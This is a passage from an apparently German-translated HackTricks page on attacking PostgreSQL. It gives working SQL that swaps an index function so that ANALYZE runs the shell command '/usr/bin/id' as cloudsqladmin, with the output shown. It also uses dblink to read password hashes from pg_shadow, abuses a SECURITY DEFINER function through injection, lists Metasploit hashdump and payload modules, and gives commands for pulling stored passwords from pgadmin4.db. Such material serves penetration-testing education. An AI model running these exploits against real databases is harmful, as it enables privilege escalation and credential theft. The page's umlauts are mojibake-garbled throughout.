5. F√ºhren Sie eine ANALYZE-Operation auf der Tabelle durch. Diese Aktion zwingt den PostgreSQL-Engine, in den Benutzerkontext des Tabellenbesitzers "cloudsqladmin" zu wechseln. Dadurch wird die b√∂sartige Indexfunktion mit den Berechtigungen von "cloudsqladmin" aufgerufen und erm√∂glicht somit die Ausf√ºhrung des zuvor nicht autorisierten Shell-Befehls.

In PostgreSQL sieht dieser Ablauf etwa so aus:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Dann enth√§lt die Tabelle `shell_commands_results` die Ausgabe des ausgef√ºhrten Codes:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokaler Login

Einige fehlerhaft konfigurierte PostgreSQL-Instanzen erm√∂glichen m√∂glicherweise die Anmeldung eines beliebigen lokalen Benutzers. Es ist m√∂glich, sich lokal von 127.0.0.1 aus mit der **`dblink`-Funktion** anzumelden:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
Beachten Sie, dass f√ºr die vorherige Abfrage **die Funktion `dblink` vorhanden sein muss**. Wenn dies nicht der Fall ist, k√∂nnen Sie versuchen, sie mit dem folgenden Befehl zu erstellen:
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

Wenn Sie das Passwort eines Benutzers mit h√∂heren Berechtigungen haben, der jedoch nicht von einer externen IP aus angemeldet werden darf, k√∂nnen Sie die folgende Funktion verwenden, um Abfragen als dieser Benutzer auszuf√ºhren:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Es ist m√∂glich zu √ºberpr√ºfen, ob diese Funktion existiert, indem man Folgendes verwendet:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Benutzerdefinierte Funktion mit** SECURITY DEFINER

[**In diesem Bericht**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql) konnten Pentester in einer von IBM bereitgestellten Postgres-Instanz eine Privilegieneskalation durchf√ºhren, weil sie diese Funktion mit dem SECURITY DEFINER-Flag gefunden haben:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
‚Ä¶
</code></pre>

Wie [**in der Dokumentation erkl√§rt**](https://www.postgresql.org/docs/current/sql-createfunction.html), wird eine Funktion mit **SECURITY DEFINER** mit den Berechtigungen des **Benutzers ausgef√ºhrt, dem sie geh√∂rt**. Daher kann sie missbraucht werden, um Privilegien in Postgres zu **eskalierten**, wenn die Funktion anf√§llig f√ºr SQL-Injection ist oder privilegierte Aktionen mit vom Angreifer kontrollierten Parametern durchf√ºhrt.

In Zeile 4 des vorherigen Codes sehen Sie, dass die Funktion das **SECURITY DEFINER**-Flag hat.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Und dann **Befehle ausf√ºhren**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Passwort-Brute-Force mit PL/pgSQL

**PL/pgSQL** ist eine **voll ausgestattete Programmiersprache**, die im Vergleich zu SQL eine gr√∂√üere prozedurale Kontrolle bietet. Sie erm√∂glicht die Verwendung von **Schleifen** und anderen **Kontrollstrukturen**, um die Programmlogik zu verbessern. Dar√ºber hinaus k√∂nnen **SQL-Anweisungen** und **Trigger** Funktionen aufrufen, die mit der **PL/pgSQL-Sprache** erstellt wurden. Diese Integration erm√∂glicht einen umfassenderen und vielseitigeren Ansatz f√ºr die Datenbankprogrammierung und Automatisierung.\
**Sie k√∂nnen diese Sprache missbrauchen, um PostgreSQL dazu zu bringen, die Anmeldeinformationen der Benutzer per Brute-Force zu ermitteln.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### Protokollierung

In der Datei _**postgresql.conf**_ k√∂nnen Sie die Protokollierung von PostgreSQL aktivieren, indem Sie Folgendes √§ndern:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Dann **starten Sie den Dienst neu**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ist eine Verwaltungs- und Entwicklungsplattform f√ºr PostgreSQL.\
Sie k√∂nnen **Passw√∂rter** in der Datei _**pgadmin4.db**_ finden.\
Sie k√∂nnen sie mithilfe der _**decrypt**_-Funktion im Skript entschl√ºsseln: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Die Client-Authentifizierung in PostgreSQL wird √ºber eine Konfigurationsdatei namens **pg_hba.conf** verwaltet. Diese Datei enth√§lt eine Reihe von Eintr√§gen, die jeweils einen Verbindungstyp, einen Client-IP-Adressbereich (falls zutreffend), den Datenbanknamen, den Benutzernamen und die Authentifizierungsmethode f√ºr √ºbereinstimmende Verbindungen angeben. Der erste Eintrag, der den Verbindungstyp, die Client-Adresse, die angeforderte Datenbank und den Benutzernamen abgleicht, wird zur Authentifizierung verwendet. Es gibt keine Ausweichm√∂glichkeit oder Backup, wenn die Authentifizierung fehlschl√§gt. Wenn kein Eintrag √ºbereinstimmt, wird der Zugriff verweigert.

Die verf√ºgbaren passwortbasierten Authentifizierungsmethoden in der pg_hba.conf sind **md5**, **crypt** und **password**. Diese Methoden unterscheiden sich darin, wie das Passwort √ºbertragen wird: MD5-gehasht, crypt-verschl√ºsselt oder Klartext. Es ist wichtig zu beachten, dass die crypt-Methode nicht mit Passw√∂rtern verwendet werden kann, die in pg_authid verschl√ºsselt wurden.

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie Pull Requests an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
